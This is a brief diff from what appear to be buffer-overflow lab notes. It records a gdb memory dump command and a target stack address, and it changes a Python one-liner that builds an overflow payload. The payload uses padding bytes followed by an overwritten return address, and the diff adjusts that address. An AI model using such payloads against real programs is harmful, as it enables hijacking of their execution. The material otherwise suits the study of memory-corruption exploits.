@@ -45,4 +45,4 @@ x/1024x $ebp
 
 the address is 0xbffffe88
 
-`python -c 'print "A"*100 + "abcdefgh"+"\x89\xfe\xff\xbf"+"mnopqrstuvwxyz"'` `python -c 'print "B"*500'`
+`python -c 'print "A"*100 + "abcdefgh"+"\x68\xf8\xff\xbf"+"mnopqrstuvwxyz"'` `python -c 'print "B"*500'`
